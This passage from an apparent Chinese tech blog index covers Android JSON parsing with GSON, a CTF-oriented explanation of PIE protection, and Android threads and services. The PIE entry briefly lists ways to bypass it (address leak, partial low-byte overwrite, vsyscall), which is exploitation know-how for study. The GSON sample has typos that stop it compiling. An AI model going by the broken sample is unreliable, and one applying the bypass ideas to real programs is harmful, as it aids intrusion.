class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.json"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseJSONWithJSONObject(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithJSONObject</span><span class="params">(String jsonData)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JSONArray jsonArray = <span class="keyword">new</span> JSONArray(jsonData);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; jsonArray.length(); i++)&#123;</span><br><span class="line">                JSONObject jsonObject = jsonArray.getJSONObject(i);</span><br><span class="line">                String id = jsonObject.getString(<span class="string">"id"</span>);</span><br><span class="line">                String name = jsonObject.getString(<span class="string">"name"</span>);</span><br><span class="line">                String version = jsonObject.getString(<span class="string">"version"</span>);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + id);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + name);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + version);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用GSON"><a href="#使用GSON" class="headerlink" title="使用GSON"></a>使用GSON</h3><p>首先添加依赖环境：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">implementation 'com.google.code.gson:gson:2.7'</span><br></pre></td></tr></table></figure>

<p>GSON库可以将一段JSON格式的字符串自动映射成一个对象（这里用Person），所以就可以直接定义一个类，然后自动解析即可了。</p>
<p>如果是数组的话会稍微麻烦：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Person&gt; people = gson.fromJson(JsonData, <span class="keyword">new</span> TypeToken&lt;List&lt;Person&gt;&gt;()&#123;&#125;.getType());</span><br></pre></td></tr></table></figure>

<p>接下来新建一个App类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String version;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getVersion</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> version;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVersion</span><span class="params">(String version)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.version = version;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后修改代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.json"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseJSONWithGSON(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithGSON</span><span class="params">(String jsonData)</span> </span>&#123;</span><br><span class="line">        Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">        List&lt;App&gt; appList = gson.fromJson(jsonData, <span class="keyword">new</span> TypeToken&lt;List&lt;App&gt;&gt;()&#123;&#125;.getType());</span><br><span class="line">        <span class="keyword">for</span>(App app : applist)&#123;</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + app.getId());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + app.getName()));</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + app.getVersion())); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PIE详解</title>
    <url>/2020/05/22/pwn/PIE%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="什么是PIE？"><a href="#什么是PIE？" class="headerlink" title="什么是PIE？"></a>什么是PIE？</h2><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p>
<h2 id="如何开启PIE"><a href="#如何开启PIE" class="headerlink" title="如何开启PIE?"></a>如何开启PIE?</h2><p>在用gcc编译时，使用如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line"></span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line"></span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line"></span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line"></span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>

<p>另外，只有在系统随机化功能开启的时候，PIE才真正的开启。否则，每次运行程序时，程序的装载地址都是固定不变的。</p>
<p>可以通过如下命令查看当前系统随机化功能的状态：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>其中，返回值有如下含义：</p>
<ul>
<li>0 = 关闭</li>
<li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li>
<li>2 = 全随机。除了1中所述，还有heap。</li>
</ul>
<p>可以通过如下命令修改为全随机（具体可参考<a href="https://blog.csdn.net/counsellor/article/details/81543197）：" target="_blank" rel="noopener">https://blog.csdn.net/counsellor/article/details/81543197）：</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure>

<h2 id="PIE绕过"><a href="#PIE绕过" class="headerlink" title="PIE绕过"></a>PIE绕过</h2><ol>
<li>直接leak出地址。</li>
<li>通过覆盖低位实现有范围限制的任意执行。（最低3/2个byte值为固定的，即在偏移0x000~0xfff任意处执行，必要时可以选择爆破，概率也不算太低）</li>
<li>直接调用vsyscall。</li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>pie</tag>
        <tag>stack</tag>
        <tag>protect</tag>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day8</title>
    <url>/2020/06/03/Android/Android-day8/</url>
    <content><![CDATA[<h1 id="探究服务"><a href="#探究服务" class="headerlink" title="探究服务"></a>探究服务</h1><h2 id="什么是服务"><a href="#什么是服务" class="headerlink" title="什么是服务"></a>什么是服务</h2><p>服务是Android中实现后台运行的解决方案。</p>
<p>服务并不是运行在一个独立的进程中，而是依赖于创建服务时所在的应用程序进程。当某个应用程序进程被杀掉时，所有依赖于该进程的服务也会停止运行。</p>
<p>另外，服务并不会自动开启线程，所有的代码都是默认运行在主线程当中的。</p>
<h2 id="Android多线程编程"><a href="#Android多线程编程" class="headerlink" title="Android多线程编程"></a>Android多线程编程</h2><h3 id="线程的基本用法"><a href="#线程的基本用法" class="headerlink" title="线程的基本用法"></a>线程的基本用法</h3><p>Android的多线程编程与java多线程编程的语法基本相同：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span>	myThread().start();</span><br></pre></td></tr></table></figure>

<p>另外还可以选择Runnable接口的方式来定义线程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">MyThread myThread = <span class="keyword">new</span> MyThread();</span><br><span class="line"><span class="keyword">new</span> Thread(myThread).start();</span><br></pre></td></tr></table></figure>

<p>当然，也可以使用匿名类的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>

<h3 id="在子线程中更新UI"><a href="#在子线程中更新UI" class="headerlink" title="在子线程中更新UI"></a>在子线程中更新UI</h3><p>新建AndroidThreadTest项目，修改布局文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/change_text"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Change Text"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/text"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerInParent</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Hello world"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"20sp"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UPDATE_TEXT = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> TextView text;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler(<span class="keyword">new</span> Handler.Callback()&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span>  <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">                <span class="keyword">case</span> UPDATE_TEXT:</span><br><span class="line">                    text.setText(<span class="string">"Nice to meet you"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        text = (TextView) findViewById(R.id.text);</span><br><span class="line">        Button changeText = (Button) findViewById(R.id.change_text);</span><br><span class="line">        changeText.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.change_text:</span><br><span class="line">                <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        Message message = <span class="keyword">new</span> Message();</span><br><span class="line">                        message.what = UPDATE_TEXT;</span><br><span class="line">                        handler.sendMessage(message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按下按钮后，子线程创建了一个Message对象，赋值后调用Handler的sendMessage()方法将其发出去。然后Handler收到这条Message并在handleMessage()方法中进行处理。</p>
<h3 id="解析异步消息处理机制"><a href="#解析异步消息处理机制" class="headerlink" title="解析异步消息处理机制"></a>解析异步消息处理机制</h3><p>Android的异步消息处理主要由4个部分组成：Message、Handle、MessageQueue、Looper。</p>
<h4 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h4><p>用于在线程之间传递消息，可以在内部携带少量的信息，用于在不同线程之间交换数据。除了what字段，还有两个整型字段arg1和arg2，以及一个Object对象字段obj。</p>
<h4 id="Handle"><a href="#Handle" class="headerlink" title="Handle"></a>Handle</h4><p>主要用于发送和处理消息。发送消息的一般是Handler的sendMessage()方法，而发出的消息经过一系列辗转处理后，最终会传递到Handler的handleMessage()方法中。</p>
<h4 id="MessageQueue"><a href="#MessageQueue" class="headerlink" title="MessageQueue"></a>MessageQueue</h4><p>消息队列，主要用于存放所有通过Handler发送的消息，这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个MessageQueue对象。</p>
<h4 id="Looper"><a href="#Looper" class="headerlink" title="Looper"></a>Looper</h4><p>每个线程中的MessageQueue管家，调用Looper的lopp()方法后，就会进入无限循环中，每当发现MessageQueue中存在一条消息，就会将它取出，并传递到Handler的handleMessage()方法中。每个线程也只会有一个Looper对象。</p>
<p><img src="./day8/1.png" alt=""></p>
<p>之前使用到的runOnUiThread()方法其实就是一个异步消息处理机制的接口封装。</p>
<h3 id="使用AsyncTask"><a href="#使用AsyncTask" class="headerlink" title="使用AsyncTask"></a>使用AsyncTask</h3><p>AsyncTask是一个抽象类。在继承时可以指定3个泛型参数，其用途如下：</p>
<ul>
<li>Params: 在执行AsyncTask时需要传入的参数，可用于在后台任务中使用。</li>
<li>Progress：后头任务执行时，如果需要在界面上显示当前进度，则使用这里指定的泛型作为进度单位。</li>
<li>Result：当任务执行完毕后，如果需要对结果进行返回，则使用这里指定的泛型作为返回值类型。</li>
</ul>
<p>AsyncTask一般来说需要重写的方法用以下几个：</p>
<ul>
<li>onPreExecute():这个方法会在后台任务开始执行之前调用，用于进行界面的初始化。</li>
<li>doInBackground(Params…)：这个方法中的所有代码都会在子线程中运行。如果需要更新UI元素，可以调用publishProgress(Progress…)方法来完成。</li>
<li>onProgressUpdate(Progress…)：在后台任务中调用了publishProgress(Progress…)方法后，onProgressUpdate(Progress…)方法很快就会被调用，在这个方法中可以对UI进行操作。</li>
<li>onPostExecute(Result)：当后台任务执行完毕并通过return语句进行返回时，这个方法就很快会被调用。</li>
</ul>
<p>假设定义了一个DownloadTask类继承自AsyncTask，那么完成构造后只需以下代码即可启动：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> DownloadTask().execute();</span><br></pre></td></tr></table></figure>

<h2 id="服务的基本用法"><a href="#服务的基本用法" class="headerlink" title="服务的基本用法"></a>服务的基本用法</h2><h3 id="定义一个服务"><a href="#定义一个服务" class="headerlink" title="定义一个服务"></a>定义一个服务</h3><p>新建一个ServiceTest项目，然后右键点击com.example.servicetest-&gt;New-&gt;Service-&gt;Service，将服务命名为MyService。修改MyService代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Not yet implemented"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中onCrete()方法会在服务创建的时候调用，onStartCommand()方法会在每次服务启动的时候调用，onDestroy()方法会在服务销毁的时候调用。</p>
<h3 id="启动和停止服务"><a href="#启动和停止服务" class="headerlink" title="启动和停止服务"></a>启动和停止服务</h3><p>修改布局文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/stop_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Stop Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改MainActivity代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService = (Button) findViewById(R.id.start_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在服务中添加打印日志：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Not yet implemented"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onCreate execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onDestroy execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span 